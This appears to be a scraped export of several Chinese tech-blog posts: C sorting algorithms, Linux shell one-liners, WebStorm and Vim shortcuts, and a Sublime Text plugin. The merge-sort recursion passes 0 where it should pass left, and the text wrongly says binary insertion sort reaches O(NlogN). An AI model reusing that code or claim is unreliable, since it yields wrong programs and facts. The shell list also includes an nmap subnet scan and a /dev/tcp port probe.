123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//快速排序#include&lt;stdio.h&gt;int FindPos(int * a, int low, int high)&#123; int val = a[low]; while (low &lt; high) &#123; while (low&lt;high &amp;&amp; a[high]&gt;=val) --high; a[low] = a[high]; while (low&lt;high &amp;&amp; a[low]&lt;=val) ++low; a[high] = a[low]; &#125;//终止while循环之后low和high一定是相等的 a[low] = val; return high; //high可以改为low, 但不能改为val 也不能改为a[low] 也不能改为a[high]&#125;void QuickSort(int *a,int low,int high)&#123; int pos; if(low&lt;high) &#123; pos = FindPos(a,low,high);//找到a数组下标low-high QuickSort(a,low,pos-1);//把元素劈成两半 左半边 QuickSort(a,pos+1,high);//右半边 &#125;&#125;void main()&#123; int i; int a[6] = &#123;2,1,3,0,5,4&#125;; QuickSort(a,0,5);//0表示第一个元素下标 5表示最后一个元素的下标 for(i = 0;i&lt;6;++i) printf(&quot;%d\\n&quot;,a[i]);&#125; 4-插入排序原理依次选择一个待排序的数据，插入到前边已排好序的序列中。 性能时间复杂度为O(N^2)，空间复杂度为O(1)。算法是稳定的，比较次数和交换次数都与初始序列有关。 优化直接插入排序每次往前插入时，是按顺序依次往前找，可在这里进行优化，往前找合适的插入位置时采用二分查找的方式，即折半插入。折半插入排序相对直接插入排序而言：平均性能更快，时间复杂度降至O(NlogN)，排序是稳定的，但排序的比较次数与初始序列无关，总是需要foor(log(i))+1次排序比较。 使用场景当数据基本有序时，采用插入排序可以明显减少数据交换和数据移动次数，进而提升排序效率 代码： 12345678910111213141516171819202122232425262728void insert_sort(int *a,int n) &#123; int i,j,temp; for(i=1;i&lt;n;i++) &#123; temp=a[i]; /*temp为要插入的元素*/ j=i-1; while(j&gt;=0&amp;&amp;temp&lt;a[j]) &#123; /*从a[i-1]开始找比a[i]小的数，同时把数组元素向后移*/ a[j+1]=a[j]; j--; &#125; a[j+1]=temp; /*插入*/ &#125; &#125; 5-希尔排序原理 Shell法是一个叫 shell 的美国人与1969年发明的。它首先把相距k(k&gt;=1)的那几个元素排好序，再缩小k值（一般取其一半），再排序，直到k=1时完成排序 插入排序的改进版，是基于插入排序的以下俩点性质而提出的改进方法： 插入排序对几乎已排好序的数据操作时，效率很高，可以达到线性排序的效率。 但插入排序在每次往前插入时只能将数据移动一位，效率比较低。 性能开始时，gap取值较大，子序列中的元素较少，排序速度快，克服了直接插入排序的缺点；其次，gap值逐渐变小后，虽然子序列的元素逐渐变多，但大多元素已基本有序，所以继承了直接插入排序的优点，能以近线性的速度排好序。 1234567891011121314151617181920212223242526272829303132333435void shell_sort(int *a,int n) &#123; int i,j,k,x; k=n/2; /*间距值*/ while(k&gt;=1) &#123; for(i=k;i&lt;n;i++) &#123; x=a[i]; j=i-k; while(j&gt;=0&amp;&amp;x&lt;a[j]) &#123; a[j+k]=a[j]; j-=k; &#125; a[j+k]=x; &#125; k/=2; /*缩小间距值*/ &#125; &#125; 6-归并排序原理 分而治之思想： Divide：将n个元素平均划分为各含n/2个元素的子序列； Conquer：递归的解决俩个规模为n/2的子问题； Combine：合并俩个已排序的子序列。 性能时间复杂度总是为O(NlogN)，空间复杂度也总为为O(N)，算法与初始序列无关，排序是稳定的。 优化优化思路： 在规模较小时，合并排序可采用直接插入； 在写法上，可以在生成辅助数组时，俩头小，中间大，这时不需要再在后边加俩个while循环进行判断，只需一次比完 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//归并排序void merge(int arr[],int temp_arr[],int left,int mid, int right)&#123; //简单归并：先复制到temp_arr，再进行归并 for (int i = left; i &lt;= right; i++)&#123; temp_arr[i] = arr[i]; &#125; int pa = left, pb = mid + 1; int index = left; while (pa &lt;= mid &amp;&amp; pb &lt;= right)&#123; if (temp_arr[pa] &lt;= temp_arr[pb])&#123; arr[index++] = temp_arr[pa++]; &#125; else&#123; arr[index++] = temp_arr[pb++]; &#125; &#125; while(pa &lt;= mid)&#123; arr[index++] = temp_arr[pa++]; &#125; while (pb &lt;= right)&#123; arr[index++] = temp_arr[pb++]; &#125;&#125;void merge_improve(int arr[], int temp_arr[], int left, int mid, int right)&#123; //优化归并：复制时，俩头小，中间大，一次比较完 for (int i = left; i &lt;= mid; i++)&#123; temp_arr[i] = arr[i]; &#125; for (int i = mid + 1; i &lt;= right; i++)&#123; temp_arr[i] = arr[right + mid + 1 - i]; &#125; int pa = left, pb = right, p = left; while (p &lt;= right)&#123; if (temp_arr[pa] &lt;= temp_arr[pb])&#123; arr[p++] = temp_arr[pa++]; &#125;else&#123; arr[p++] = temp_arr[pb--]; &#125; &#125;&#125;void merge_sort(int arr[],int temp_arr[], int left, int right)&#123; if (left &lt; right)&#123; int mid = (left + right) / 2; merge_sort(arr,temp_arr,0, mid); merge_sort(arr, temp_arr,mid + 1, right); merge(arr,temp_arr,left,mid,right); &#125;&#125;void merge_sort(int arr[], int len)&#123; int *temp_arr = (int*)malloc(sizeof(int)*len); merge_sort(arr,temp_arr, 0, len - 1);&#125; 7-堆排序原理 堆的性质： 是一棵完全二叉树 每个节点的值都大于或等于其子节点的值，为最大堆；反之为最小堆。 堆排序思想： 将待排序的序列构造成一个最大堆，此时序列的最大值为根节点 依次将根节点与待排序序列的最后一个元素交换 再维护从根节点到该元素的前一个节点为最大堆，如此往复，最终得到一个递增序列 性能时间复杂度为O(NlogN)，空间复杂度为O(1)，因为利用的排序空间仍然是初始的序列，并未开辟新空间。算法是不稳定的，与初始序列无关。 使用场景想知道最大值或最小值时，比如优先级队列，作业调度等场景。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * 将数组arr构建大根堆 * @param arr 待调整的数组 * @param i 待调整的数组元素的下标 * @param len 数组的长度 */ void heap_adjust(int arr[], int i, int len) &#123; int child; int temp; for (; 2 * i + 1 &lt; len; i = child) &#123; child = 2 * i + 1; // 子结点的位置 = 2 * 父结点的位置 + 1 // 得到子结点中键值较大的结点 if (child &lt; len - 1 &amp;&amp; arr[child + 1] &gt; arr[child]) child ++; // 如果较大的子结点大于父结点那么把较大的子结点往上移动，替换它的父结点 if (arr[i] &lt; arr[child]) &#123; temp = arr[i]; arr[i] = arr[child]; arr[child] = temp; &#125; else break; &#125; &#125; /** * 堆排序算法 */ void heap_sort(int arr[], int len) &#123; int i; // 调整序列的前半部分元素，调整完之后第一个元素是序列的最大的元素 for (int i = len / 2 - 1; i &gt;= 0; i--) &#123; heap_adjust(arr, i, len); &#125; for (i = len - 1; i &gt; 0; i--) &#123; // 将第1个元素与当前最后一个元素交换，保证当前的最后一个位置的元素都是现在的这个序列中最大的 int temp = arr[0]; arr[0] = arr[i]; arr[i] = temp; // 不断缩小调整heap的范围，每一次调整完毕保证第一个元素是当前序列的最大值 heap_adjust(arr, 0, i); &#125; &#125; 总结","categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://ru23.com/categories/Algorithm/"}],"tags":[{"name":"排序算法","slug":"排序算法","permalink":"https://ru23.com/tags/排序算法/"}]},{"title":"Python学习笔记[思维导图]","slug":"2016-04-Python学习笔记-思维导图","date":"2016-04-20T09:31:39.000Z","updated":"2018-10-24T03:46:01.642Z","comments":true,"path":"note/85e04178.html","link":"","permalink":"https://ru23.com/note/85e04178.html","excerpt":"第一部分 Python语言第一章 基本环境","text":"第一部分 Python语言第一章 基本环境 第二章 内置类型 第三章 表达式 第四章 函数 第五章 迭代器 第六章 模块 第七章 类 第八章 异常 第九章 装饰器 第十章 描述符 第十一章 元类 第二部分 标准库 第三部分 扩展库** 附录","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"python","slug":"python","permalink":"https://ru23.com/tags/python/"}]},{"title":"73条日常Linux shell命令汇总","slug":"2016-04-73条日常Linux-shell命令汇总","date":"2016-04-17T01:32:41.000Z","updated":"2018-10-24T03:46:01.640Z","comments":true,"path":"note/b1c67ad.html","link":"","permalink":"https://ru23.com/note/b1c67ad.html","excerpt":"检查远程端口是否对bash开放：","text":"检查远程端口是否对bash开放： echo &gt;/dev/tcp/8.8.8.8/53 &amp;&amp; echo &quot;open&quot; 让进程转入后台：Ctrl + z 将进程转到前台：fg 产生随机的十六进制数，其中n是字符数：openssl rand -hex n 在当前shell里执行一个文件里的命令：source /home/user/file.name 截取前5个字符：${variable:0:5} SSH debug 模式:ssh -vvv user@ip_address SSH with pem key:ssh user@ip_address -i key.pem 用wget抓取完整的网站目录结构，存放到本地目录中：wget -r --no-parent --reject &quot;index.html*&quot; http://hostname/ -P /home/user/dirs 一次创建多个目录：mkdir -p /home/user/{test,test1,test2} 列出包括子进程的进程树：ps axwef 创建 war 文件:jar -cvf name.war file 测试硬盘写入速度：dd if=/dev/zero of=/tmp/output.img bs=8k count=256k; rm -rf /tmp/output.img 测试硬盘读取速度：hdparm -Tt /dev/sda 获取文本的md5 hash：echo -n &quot;text&quot; | md5sum 检查xml格式：xmllint --noout file.xml 将tar.gz提取到新目录里：tar zxvf package.tar.gz -C new_dir 使用curl获取HTTP头信息：curl -I http://www.example.com 修改文件或目录的时间戳(YYMMDDhhmm):touch -t 0712250000 file 用wget命令执行ftp下载：wget -m ftp://username:password@hostname 生成随机密码(例子里是16个字符长):LANG=c &lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo; 快速备份一个文件：cp some_file_name{,.bkp} 访问Windows共享目录：smbclient -U &quot;DOMAIN\\user&quot; //dc.domain.com/share/test/dir 执行历史记录里的命令(这里是第100行):!100 解压:unzip package_name.zip -d dir_name 输入多行文字(CTRL + d 退出):cat &gt; test.txt 创建空文件或清空一个现有文件：\\&gt; test.txt 与Ubuntu NTP server同步时间：ntpdate ntp.ubuntu.com 用netstat显示所有tcp4监听端口：netstat -lnt4 | awk &apos;{print $4}&apos; | cut -f2 -d: | grep -o &apos;[0-9]*&apos; qcow2镜像文件转换：qemu-img convert -f qcow2 -O raw precise-server-cloudimg-amd64-disk1.img \\precise-server-cloudimg-amd64-disk1.raw 重复运行文件，显示其输出（缺省是2秒一次）：watch ps -ef 所有用户列表：getent passwd Mount root in read/write mode:mount -o remount,rw / 挂载一个目录（这是不能使用链接的情况）:mount --bind /source /destination 动态更新DNS server:nsupdate &lt; &lt;EOF update add $HOST 86400 A $IP send EOF 递归grep所有目录：grep -r &quot;some_text&quot; /path/to/dir 列出前10个最大的文件：lsof / | awk &apos;{ if($7 &gt; 1048576) print $7/1048576 &quot;MB &quot;$9 }&apos; | sort -n -u | tail 显示剩余内存(MB):free -m | grep cache | awk &apos;/[0-9]/{ print $4&quot; MB&quot; }&apos; 打开Vim并跳到文件末：vim + some_file_name Git 克隆指定分支(master):git clone git@github.com:name/app.git -b master Git 切换到其它分支(develop):git checkout develop Git 删除分支(myfeature):git branch -d myfeature Git 删除远程分支git push origin :branchName Git 将新分支推送到远程服务器：git push -u origin mynewfeature 打印历史记录中最后一次cat命令：!cat:p 运行历史记录里最后一次cat命令：!cat 找出/home/user下所有空子目录:find /home/user -maxdepth 1 -type d -empty 获取test.txt文件中第50-60行内容：&lt; test.txt sed -n &apos;50,60p&apos; 运行最后一个命令(如果最后一个命令是mkdir /root/test, 下面将会运行: sudo mkdir /root/test)：sudo !! 创建临时RAM文件系统 – ramdisk (先创建/tmpram目录):mount -t tmpfs tmpfs /tmpram -o size=512m Grep whole words:grep -w &quot;name&quot; test.txt 在需要提升权限的情况下往一个文件里追加文本：echo &quot;some text&quot; | sudo tee -a /path/file 列出所有kill signal参数:kill -l 在bash历史记录里禁止记录最后一次会话：kill -9 $$ 扫描网络寻找开放的端口：nmap -p 8081 172.20.0.0/16 设置git email:git config --global user.email &quot;me@example.com&quot; To sync with master if you have unpublished commits:git pull --rebase origin master 将所有文件名中含有”txt”的文件移入/home/user目录:find -iname &quot;*txt*&quot; -exec mv -v {} /home/user \\; 将文件按行并列显示：paste test.txt test1.txt shell里的进度条:pv data.log 使用netcat将数据发送到Graphite server:echo &quot;hosts.sampleHost 10 `date +%s`&quot; | nc 192.168.200.2 3000 将tabs转换成空格：expand test.txt &gt; test1.txt Skip bash history:&lt; space &gt;cmd 去之前的工作目录：cd - 拆分大体积的tar.gz文件(每个100MB)，然后合并回去：split –b 100m /path/to/large/archive /path/to/output/files cat files* &gt; archive 使用curl获取HTTP status code:curl -sL -w &quot;%{http_code}\\\\n&quot; www.example.com -o /dev/null 设置root密码，强化MySQL安全安装:/usr/bin/mysql_secure_installation 当Ctrl + c不好使时:Ctrl + \\ 获取文件owner:stat -c %U file.txt block设备列表：lsblk -f 找出文件名结尾有空格的文件：find . -type f -exec egrep -l &quot; +$&quot; {} \\; 找出文件名有tab缩进符的文件find . -type f -exec egrep -l $&apos;\\t&apos; {} \\; 用”=”打印出横线:全选复制放进笔记printf &apos;%100s\\n&apos; | tr &apos; &apos; =","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"}]},{"title":"基于鸟哥linux私房菜整理的常用基本命令","slug":"2016-04-基于鸟哥linux私房菜整理的常用基本命令","date":"2016-04-17T01:19:02.000Z","updated":"2018-10-24T03:46:01.647Z","comments":true,"path":"note/a6d76d30.html","link":"","permalink":"https://ru23.com/note/a6d76d30.html","excerpt":"1、显示日期的指令： date","text":"1、显示日期的指令： date 2、显示日历的指令：cal 3、简单好用的计算器：bc 怎么10/100会变成0呢？这是因为bc预设仅输出整数，如果要输出小数点下位数，那么就必须要执行 scale=number ，那个number就是小数点位数，例如： 4、重要的几个热键[Tab],[ctrl]-c, [ctrl]-d [Tab]按键—具有『命令补全』不『档案补齐』的功能 [Ctrl]-c按键—让当前的程序『停掉』 [Ctrl]-d按键—通常代表着：『键盘输入结束(End Of File, EOF 戒 End OfInput)』的意思；另外，他也可以用来取代exit 5、man 退出用q，man -f man 6、数据同步写入磁盘： sync 输入sync，那举在内存中尚未被更新的数据，就会被写入硬盘中；所以，这个挃令在系统关机戒重新启劢乀前， 径重要喔！最好多执行几次！ 7、惯用的关机指令：shutdown 此外，需要注意的是，时间参数请务必加入指令中，否则shutdown会自动跳到 run-level 1 (就是单人维护的登入情况)，这样就伤脑筋了！底下提供几个时间参数的例子吧： 重启，关机： reboot, halt,poweroff 8、切换执行等级： init Linux共有七种执行等级： –run level 0 :关机 –run level 3 :纯文本模式 –run level 5 :含有图形接口模式 –run level 6 :重新启动 使用init这个指令来切换各模式： 如果你想要关机的话，除了上述的shutdown -h now以及poweroff之外，你也可以使用如下的指令来关机： 9、改变文件的所属群组：chgrp 10、改变文件拥有者：chown 他还可以顸便直接修改群组的名称 11、改变文件的权限：chmod 权限的设定方法有两种， 分别可以使用数字或者是符号来进行权限的变更。 –数字类型改变档案权限： –符号类型改变档案权限： 12、查看版本信息等 13、变换目录：cd 14、显示当前所在目录：pwd 15、建立新目录：mkdir 不建议常用-p这个选项，因为担心如果你打错字，那么目录名称就回变得乱七八糟的 16、删除『空』的目录：rmdir 17、档案与目录的显示：ls 18、复制档案或目录：cp 19、移除档案或目录：rm 20、移动档案与目录，或更名：mv 21、取得路径的文件名与目录名：basename，dirname 22、由第一行开始显示档案内容：cat 23、从最后一行开始显示：tac（可以看出 tac 是 cat 的倒着写） 24、显示的时候，顺道输出行号：nl 25、一页一页的显示档案内容：more 26、与 more 类似，但是比 more 更好的是，他可以往前翻页：less 27、只看头几行：head 28、只看尾几行：tail 29、以二进制的放置读取档案内容：od 30、修改档案时间或新建档案：touch 31、档案预设权限：umask 32、配置文件档案隐藏属性：chattr 33、显示档案隐藏属性：lsattr 34、观察文件类型：file 35、寻找【执行挡】：which 36、寻找特定档案：whereis 37、寻找特定档案：locate 38、寻找特定档案：find 39、压缩文件和读取压缩文件：gzip，zcat 40、压缩文件和读取压缩文件：bzip2，bzcat 41、压缩文件和读取压缩文件：tar 12: http://img.my.csdn.net/uploads/201303/22/1363936158_46941]: http://img.my.csdn.net/uploads/201303/22/1363936145_2758.png 58: http://img.my.csdn.net/uploads/201303/22/1363936923_33797]: http://img.my.csdn.net/uploads/201303/22/1363936910_4210.png","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"}]},{"title":"webstorm常用快捷键","slug":"2016-04-webstorm使用总结","date":"2016-04-10T03:18:06.000Z","updated":"2018-10-24T03:46:01.644Z","comments":true,"path":"note/6bf097e2.html","link":"","permalink":"https://ru23.com/note/6bf097e2.html","excerpt":"webstorm常用快捷键 查找/代替","text":"webstorm常用快捷键 查找/代替 ctrl+shift+N 通过文件名快速查找工程内的文件（必记） ctrl+shift+alt+N 通过一个字符快速查找位置（必记） ctrl+F 在文件内快速查找代码 F3 查找下一个 shift+F3 查找上一个 ctrl+R 文件内代码替换 ctrl+shift+R 指定目录内代码批量替换 ctrl+shift+F 指定目录内代码批量查找 ctrl+R 文件内代码替换 界面操作 ctrl+shift+A 快速查找并使用编辑器所有功能（必记） alt+[0-9] 快速拆合功能界面模块 ctrl+shift+F12 最大区域显示代码（会隐藏其他的功能界面模块） alt+shift+F 将当前文件加入收藏夹 ctrl+alt+s 打开配置窗口 ctrl+tab 切换代码选项卡（还要进行此选择，效率差些） ctrl+F4 关闭当前代码选项卡 代码编辑 ctrl+D 复制当前行 ctrl+W 选中单词 alt+Insert 新建一个文件或其他 ctrl+alt+L 格式化代码 shift+tab 减少（可以在代码中减少行缩进） tab 扩大缩进 ctrl+Y 删除一行 shift+enter 重新开始一行（无论光标在哪个位置） esc 进入代码编辑区域 alt+F1 查找代码在其他界面模块的位置，颇为有用 ctrl+G 到指定行的代码 ctrl+]/[ 光标到代码块的前面或后面 alt+up/down 上一个/下一个方法 建议配置版本控制快捷键 ctrl+C 提交代码 ctrl+p 向远程版本库推送更新 ctrl+G 到指定行的代码 常用 ctrl + shift + n: 打开工程中的文件 ctrl + j: 输出模板 ctrl + b: 跳到变量申明处 ctrl + alt + T: 围绕包裹代码(包括zencoding的Wrap with Abbreviation), - ctrl + []: 匹配 {}[] ctrl + F12: 可以显示当前文件的结构，快速跳转到目标函数 alt + left/right:标签切换 ctrl + r: 替换 ctrl + shift + r: 全局替换 ctrl + d: 行复制 ctrl + shift + ]/[: 选中块代码…. ctrl + / : 单行注释 ctrl + shift + / : 块注释 ctrl + shift + i : 显示当前class,function的详细信息 ctrl + p: 显示默认参数 ctrl + shift + v: 可以复制多个文本 shift + enter: 智能跳到下一行 ctrl + alt + enter: 在上一行添加空白行vb ctrl + k: svn 提交 ctrl + shift + u: 大小写 ctrl + ~ : 切换主题 ctrl + F11: 添加标签 ctrl + shift + 大键盘数字键, F11:添加空标签, shift+F11:显示标签列表，方便快捷跳转 ctrl + alt + F12: file path ctrl + alt + a: search keymap shift + F6: 重构标签名 Ctrl+delete 删除光标后面的单词 Ctrl+BackSpace 删除光标前面的单词 Ctrl+小键盘+/- 折叠/展开代码 Ctrl + Alt + V 快速引进一个变量 Ctrl+Alt + I 自动对齐格式 alt+j: 多选单个单词","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"webstorm","slug":"webstorm","permalink":"https://ru23.com/tags/webstorm/"}]},{"title":"sublimeText3配置浏览器预览路径localhost","slug":"2016-03-sublimeText3配置浏览器预览路径localhost","date":"2016-03-29T00:45:35.000Z","updated":"2018-10-24T03:46:01.553Z","comments":true,"path":"note/fba80764.html","link":"","permalink":"https://ru23.com/note/fba80764.html","excerpt":"Sublime Text 2 Sublime Text 3 都可以使用:","text":"Sublime Text 2 Sublime Text 3 都可以使用: 菜单 –&gt; Tools –&gt; New Pugin清掉内容, 添加如下代码123456789101112131415161718192021import sublime, sublime_pluginimport webbrowserurl_map = &#123; &apos;E:\\phpStudy\\WWW&apos; : &apos;http://localhost&apos;,&#125;class OpenBrowserCommand(sublime_plugin.TextCommand): def run(self,edit): window = sublime.active_window() window.run_command(&apos;save&apos;) url = self.view.file_name() flag = False for path, domain in url_map.items(): if url.startswith(path): url = url.replace(path, domain).replace(&apos;\\\\&apos;, &apos;/&apos;) flag = True break if not flag: url = &apos;file://&apos; + url webbrowser.open_new(url) 然后保存文件, 保存的路径类似如下: C:\\Users\\XXXX\\AppData\\Roaming\\Sublime Text 3\\Packages\\User\\open_browser.py XXXX 为 Windows 7 系统用户, 该目录可以直接通过 Sublime 菜单找到 菜单 –&gt; Preferences –&gt; Browse Packages 点击后打开的就是该目录注意:E:\\phpStudy\\WWW 请替换成你 Web 文档根目录所在路径 绑定快捷键 菜单 –&gt; Preferences –&gt; Key Bindings-User添加如下代码 [{ &quot;keys&quot;: [&quot;ctrl+b&quot;], &quot;command&quot;: &quot;open_browser&quot; }]","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"常用的XHTML标签整理","slug":"2016-03-常用的XHTML标签整理","date":"2016-03-26T02:54:51.000Z","updated":"2018-10-24T03:46:01.632Z","comments":true,"path":"note/43c4688e.html","link":"","permalink":"https://ru23.com/note/43c4688e.html","excerpt":"","text":"","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"XHTML","slug":"XHTML","permalink":"https://ru23.com/tags/XHTML/"}]},{"title":"Vim快捷键分类","slug":"2016-03-Vim快捷键分类","date":"2016-03-25T01:24:36.000Z","updated":"2018-10-24T03:46:01.575Z","comments":true,"path":"note/3512468a.html","link":"","permalink":"https://ru23.com/note/3512468a.html","excerpt":"一. 移动：h,j,k,l: 左，下，上，右。 w: 下一个词的词首。 e:下一个词的词尾。 b:上一个词的词首。 &lt;&gt;: v 模式选中后进行缩进。","text":"一. 移动：h,j,k,l: 左，下，上，右。 w: 下一个词的词首。 e:下一个词的词尾。 b:上一个词的词首。 &lt;&gt;: v 模式选中后进行缩进。 二. 跳转：%: 可以匹配{},&quot;&quot;,(),[]之间跳转。 H、M、L：直接跳转到当前屏幕的顶部、中部、底部。 #H：跳转到当前屏的第#行。 #L：跳转到当前屏的倒数第#行。 zt: 当前编辑行置为屏顶。 zz: 当前编辑行置为屏中。 zb: 当前编辑行置为屏底。 G：直接跳转到文件的底部。 gg: 跳转到文件首。 ():跳转到当前的行首、行尾。 {}：向上、向下跳转到最近的空行。 [{：跳转到目前区块开头。 ]}：跳转到目前区块结尾。 0: 跳转到行首。 $: 跳转到行尾。 2$: 跳转到下一行的行尾。 #：跳转到该行的第#个位置。 #G: 15G,跳转到15行。 :#：跳转到#行。 f&apos;n&apos;：跳转到下一个&quot;n&quot;字母后。 ctrl+b: 向后翻一页。 ctrl+f：向前翻一页。 ctrl+u: 向后翻半页。 ctrl+d: 向前翻半页。 ctry+e: 下滚一行。 三. 选择：1.V: 选择一行。 2.^V: 矩形选择。 3.v3w: 选择三个字符。 四. 编辑：1. 新增： i: 光标前插入。 I: 在当前行首插入。 a: 光标后插入。 A: 当前行尾插入。 O: 在当前行之前插入新行。 o: 在当前行之后插入新行。 2. 修改 c(change) 为主： r: 替换光标所在处的字符。 R：替换光标所到之处的字符。 cw: 更改光标所在处的字到字尾处。 c#w: c3w 修改3个字符。 C：修改到行尾。 ci&apos;：修改配对标点符号中的文本内容。 di&apos;：删除配对标点符号中的文本内容。 yi&apos;：复制配对标点符号中的文本内容。 vi&apos;：选中配对标点符号中的文本内容。 s：替换当前一个光标所处字符。 #S：删除 # 行，并以新文本代替。 3. 删除 d(delete) 为主： D：删除到行尾。 X: 每按一次，删除光标所在位置的前面一个字符。 x: 每按一次，删除光标所在位置的后面一个字符。 #x: 删除光标所在位置后面6个字符。 d^: 删至行首。 d$: 删至行尾。 dd:(剪切)删除光标所在行。 dw: 删除一个单词/光标之后的单词剩余部分。 d4w: 删除4个word。 #dd: 从光标所在行开始删除#行。 daB: 删除{}及其内的内容。 diB: 删除{}中的内容。 n1,n2 d：将n1,n2行之间的内容删除。 4. 查找： /： 输入关键字，发现不是要找的，直接在按n，向后查找直到找到为止。 ?： 输入关键字，发现不是要找的，直接在按n，向前查找直到找到为止。 *: 在当前页向后查找同一字。 #: 在当前页向前查找同一字。 5. 复制 y(yank)为主： yw: 将光标所在之处到字尾的字符复制到缓冲区中。 #yw: 复制#个字到缓冲区。 Y：相当于yy, 复制整行。 #yy:表示复制从光标所在的该行往下数#行文字。 p: 粘贴。所有与y相关的操作必用p来结合粘贴。 n1,n2 co n3：复制第n1行到第n2行之间的内容到第n3行后面。 6. 大小写转换： gUU: 将当前行的字母改为大写。 guu: 将当前行的字母改为小写。 gUw: 将当前光标下的单词改为大写。 guw: 将当前光标下的单词改为小写。 a. 整篇大写: ggguG gg: 光标到文件第一个字符。 gu: 把选择范围全部小写。 G: 到文件结束。 b. 整篇小写：gggUG 7. 其它： J：当前行和下一行合并成一行。 8. 移动： n1,n2 m n3：将n1行到n2行之间的内容移至n3行下。 五.退出：1. w filename: 保存正在编辑的文件filename 2. wq filename: 保存后退出正在编辑的文件filename 3. q：退出不保存。 六.窗口操作：1. ctrl+w p: 在两个分割窗口之间来回切换。 2. ctrl+w j: 跳到下面的分割窗 3. ctrl+w h: 跳到左边的分割窗。 4. ctrl+w k: 跳到上面的分割窗。 5. ctrl+w l: 跳到右边的分割窗。","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://ru23.com/tags/Vim/"}]},{"title":"Vim的分屏功能","slug":"2016-03-Vim的分屏功能","date":"2016-03-21T02:04:57.000Z","updated":"2018-10-24T03:46:01.586Z","comments":true,"path":"note/a753b8d8.html","link":"","permalink":"https://ru23.com/note/a753b8d8.html","excerpt":"分屏启动Vim 使用大写的O参数来垂直分屏。 vim -On file1 file2 …","text":"分屏启动Vim 使用大写的O参数来垂直分屏。 vim -On file1 file2 … 使用小写的o参数来水平分屏 vim -on file1 file2 … 注释: n是数字，表示分成几个屏 关闭分屏 关闭当前窗口 Ctrl+W c 关闭当前窗口，如果只剩最后一个了，则退出Vim Ctrl+W q 分屏 上下分割当前打开的文件。 Ctrl+W s 上下分割，并打开一个新的文件 :sp filename 左右分割当前打开的文件 Ctrl+W v 左右分割，并打开一个新的文件 :vsp filename 移动光标 Vi中的光标键是h, j, k, l，要在各个屏间切换，只需要先按一下Ctrl+W 把光标移到右边的屏 Ctrl+W l 把光标移到左边的屏中。 Ctrl+W h 把光标移到上边的屏中。 Ctrl+W k 把光标移到下边的屏中。 Ctrl+W j 把光标移到下一个的屏中。. Ctrl+W w 移动分屏 这个功能还是使用了Vim的光标键，只不过都是大写。当然了，如果你的分屏很乱很复杂的话，这个功能可能会出现一些非常奇怪的症状。 向右移动。 Ctrl+W L 向左移动 Ctrl+W H 向上移动 Ctrl+W K 向下移动 Ctrl+W J 屏幕尺寸 下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用[Ctrl+W &lt;]或是[Ctrl+W &gt;]，但这可能需要最新的版本才支持。 让所有的屏都有一样的高度。 Ctrl+W = 增加高度。 Ctrl+W + 减少高度。 Ctrl+W - 文章来源网络","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://ru23.com/tags/Vim/"}]},{"title":"简明 Vim 练级攻略","slug":"2016-03-Vim-简明-练级攻略","date":"2016-03-21T01:42:03.000Z","updated":"2018-10-24T03:46:01.562Z","comments":true,"path":"note/36face89.html","link":"","permalink":"https://ru23.com/note/36face89.html","excerpt":"第一级 – 存活下面是一些命令，可以让你在 Normal 模式下幸存下来：","text":"第一级 – 存活下面是一些命令，可以让你在 Normal 模式下幸存下来： i → Insert 模式，按 ESC 回到 Normal 模式. x → 删当前光标所在的一个字符。 :wq → 存盘 + 退出 (:w 存盘, :q 退出) （陈皓注：:w 后可以跟文件名） dd → 删除当前行，并把删除的行存到剪贴板里 p → 粘贴剪贴板 推荐: hjkl (强例推荐使用其移动光标，但不必需) →你也可以使用光标键 (←↓↑→). 注: j 就像下箭头。 :help → 显示相关命令的帮助。你也可以就输入 :help 而不跟命令。（陈皓注：退出帮助需要输入:q） 注意：在VIM的Normal模式下，所有的键就是功能键 你能在vim幸存下来只需要上述的那5个命令，你就可以编辑文本了，你一定要把这些命令练成一种下意识的状态。于是你就可以开始进阶到第二级了 第二级 – 感觉良好1、各种插入模式 a → 在光标后插入 o → 在当前行后插入一个新行 O → 在当前行前插入一个新行 cw → 替换从光标所在位置后到一个单词结尾的字符 2、简单的移动光标 0 → 数字零，到行头 ^ → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等） $ → 到本行行尾 g_ → 到本行最后一个不是blank字符的位置。 /pattern → 搜索 pattern 的字符串（注：如果搜索出多个匹配，可按n键到下一个） 3、拷贝/粘贴 （皓注：p/P都可以，p是表示在当前位置之后，P表示在当前位置之前） P → 粘贴 yy → 拷贝当前行当行于 ddP 4、Undo/Redo u → undo&lt;C-r&gt; → redo 5、打开/保存/退出/改变文件(Buffer) :e &lt;path/to/file&gt; → 打开一个文件 :w → 存盘 :saveas &lt;path/to/file&gt; → 另存为 &lt;path/to/file&gt; :x， ZZ 或 :wq → 保存并退出 (:x 表示仅在需要时保存，ZZ不需要输入冒号并回车) :q! → 退出不保存 :qa! 强行退出所有的正在编辑的文件，就算别的文件有更改。 :bn 和 :bp → 